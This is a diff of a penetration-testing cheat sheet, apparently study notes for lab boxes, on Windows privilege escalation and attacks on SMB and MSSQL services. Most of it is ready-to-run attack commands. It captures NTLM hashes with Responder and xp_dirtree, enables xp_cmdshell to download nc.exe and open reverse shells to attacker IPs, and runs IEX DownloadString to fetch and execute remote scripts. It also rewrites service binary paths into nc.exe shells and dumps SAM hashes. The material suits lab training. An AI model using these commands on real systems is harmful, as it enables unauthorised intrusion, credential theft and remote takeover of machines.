@@ -191,7 +191,7 @@ use the following website for the rainbow table attack
 - first use ip a command to check the IP and interface of the machine
 -     ip a
 - secondly, run responder
--     sudo responder -I <interface>
+-     sudo responder -I <interface> -v
 - from the target machine list any smb share to get the authentication from the responder
 -     dir \\<Kali_IP>\test 'Note: this will give access denied. go and check the output of responder'
 - save the output to file.hash and check the correct mode
@@ -332,7 +332,7 @@ in the meterpreter shell type
 sometimes you need to migrate to another process to get the NT AUTHORITY\SYSTEM
 use godpotato
 check Jeeves box FYR
-1- use juicy potato by transferring the file to the target machine (AV is off)
+1- use juicy potato by transferring the file to the target machine (AV is off). JuicyPotato doesn't work on windows server 2019 and windows 10 build 1809. use PrintSpoofer insted.
 download exe file -> https://github.com/ohpe/juicy-potato/releases/tag/v0.1
 -     juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID of your windows machine} #you can get it from https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
 2- use juicy potato by setting up your SMB server (AV is on)
@@ -356,6 +356,7 @@ setup a smbserver
 cd to the share
 -     cd \\10.10.16.13\raman
 -     cp c:\users\raman\raman.kdbx .
+
 setup an FTP server
 -     python -m pyftpdlib -p 21 --write    (pip3 install pyftpdlib  #to download it) (kali)
 head to C:\Tools\Source and connect to the kali FTP server, anonymous login, then put the windows_service.c file
@@ -427,16 +428,13 @@ compile the c file. transfer it to Windows. download the dll file. move to the w
 
 12- Binary Path
 run PowerUp.ps1
-in the cmd type 
--     accesschk64.exe -uwcv Everyone *
-the output shows 'RW daclsvc' this means you have read and write in the daclsvc service. look for SERVICE_CHANGE_CONFIG in the output 
--     accesschk64.exe -uwcv daclsvc #get more information on the service
-if you find SERVICE_CHANGE_CONFIG in the daclsvc service means you can change the configuration 
-query the service
--     sc qc daclsvc
-if you find BINARY_PATH_NAME in the output you can change the configuration 
--     sc config daclsvc binpath* "net localgroup administrators user /add" #add the user in the administrators group
--     sc start daclsvc #start the service again
+Get more information about the service
+-     sc qc UsoSvc   #check BINARY_PATH_NAME
+overwrite the binpath of the service
+-     sc config <Service> binpath="C:\Users\mssql-svc\Desktop\nc.exe 10.10.16.14 9004 -e cmd.exe"
+check the binary path again
+-     sc stop <Service>     #stop the service
+-     sc start <Service>    #start it again
 
 13- Unquoted Service Path
 this means the service path doesn't have quotes  so what will happen is the windows will run the following path as Program.exe -> Program Files.exe -> Unqouted.exe -> Unqouted Path.exe -> Unqouted Path Service.exe.
@@ -448,6 +446,8 @@ create a common.exe file using msfvenom -p windows/meterpreter/reverse_tcp LHOST
 move the file to the common path and upload the file then start the service again 
 -     sc start ServiceName
 
+Extract the hash from windows. you need to have sam, security, and system files
+-     secretsdump.py -sam SAM -security SECURITY -system SYSTEM local
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Platforms
@@ -631,6 +631,7 @@ It will get with autorecon (UDP Port)
 -     evil-winrm -I 192.168.10.10 -u ‘raman’ -p ‘ramanpassword’  (login with this command)
 PORT 139, port 445  (also PORT 137 (name services) & PORT 138 (datagam) UDP netbios)
 Always check guest login and then check public share with write and execute permission and you will find credential, files pdf ps1 etc
+-     mount -t cifs //10.10.10.134/Backups /mnt/remote -o username=" ",password=" ",uid=$(id -u),gid=$(id -g)   (mount SMB shares)
 -     nmap -v -script smb-vuln* -p 139,445 10.10.10.10
 -     smbmap -H 192.168.10.10   (public shares) (check read write and execute)
 -     smbmap -H 192.168.10.10 -R tmp   (check specific folder like tmp)
@@ -651,20 +652,25 @@ Find credential with other port and use default to login
 -     mysql -u root -p 'root' -h 192.168.10.10 -P 3306
 -     select version(); | show databases;  | use databse | select * from users; | show tables |  select system_user(); | SELECT user, authentication_string FROM mysql.user WHERE user = Pre
 MSSQL 1433, 4022, 135, 1434, UDP 1434
-For this port, you can find credentials from another port and log in with ipacket-mssqlclient
+For this port, you can find credentials from another port and log in with ipacket-mssqlclient. check HackTricks for exploitation
 -     nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip
 -     impacket-mssqlclient raman:'raman@321@1!'@192.168.10.10
 -     impacket-mssqlclient Administrator: 'raman@321@1!'@192.168.10.10 -windows-auth
+-     mssqlclient.py -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
 -     SELECT @@version;  | SELECT name FROM sys.databases;  | SELECT  FROM offsec.information_schema.tables;  |  select  from offsec.dbo.users;
+Steal NTLM hash using responder
+-     exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
 Connect as CMD database
 -     SQL> EXECUTE sp_configure 'show advanced options', 1;
 -     SQL> RECONFIGURE;
 -     SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
 -     SQL> RECONFIGURE;
 -     EXEC xp_cmdshell 'whoami';
--     exec xp_cmdshell 'cmd /c powershell -c "curl 192.168.10.10/nc.exe -o \windows\temp\nc.exe"';
--     exec xp_cmdshell 'cmd /c dir \windows\temp';
--     exec xp_cmdshell 'cmd /c "\windows\temp\nc.exe 192.168.10.10 443 -e cmd"';
+-     exec xp_cmdshell 'cmd /c powershell -c "curl 192.168.10.10/nc.exe -o C:\windows\temp\nc.exe"';
+-     exec xp_cmdshell 'cmd /c dir C:\windows\temp';
+-     exec xp_cmdshell 'cmd /c "C:\windows\temp\nc.exe 192.168.10.10 443 -e cmd"';
+Get Reverse Shell
+-     EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
 also applied on SQL Injection login
 PORT 5437 & PORT 5432 PostgreSQL
 If you find this port, follow the commands below, and you can easily find credentials from another port as well
@@ -697,7 +703,7 @@ Powerup     In the last line type Invoke-AllChecks
 -     certutil.exe -urlcache -split -f http://192.168.10.10/PowerUp.ps1
 powershell -ep bypass .\PowerUp.ps1     OR
 powershell -ep bypass | Invoke-AllChecks (check all possible vulnerability except plaintext passwd)     OR
-echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2/PowerUp.ps1') | powershell -noprofile -   #download and execute (working)
+echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.14/PowerUp.ps1') | powershell -noprofile -   #download and execute (working)
 Winpeas.exe (all including plaintext passwd)
 Windpeas.exe If .net 4.5 (run otherwise)
 -     certutil.exe -urlcache -split -f http://192.168.10.10:8080/winPEASx64.exe
@@ -761,6 +767,14 @@ Get-ModifiableServiceFile
 •         curl 192.168.10.10/rev.exe -o raman.exe
 •         cp raman.exe "C:\program files\raman\"
 •         net start raman
+another way:
+Get more information about the service
+-     sc qc UsoSvc   #check BINARY_PATH_NAME
+overwrite the binpath of the service
+-     sc config <Service> binpath="C:\Users\mssql-svc\Desktop\nc.exe 10.10.16.14 9004 -e cmd.exe"
+check the binary path again
+-     sc stop <Service>     #stop the service
+-     sc start <Service>    #start it again
  unquoted path
 •         Get-UnquotedService
 •         Permission check and service stop / start check
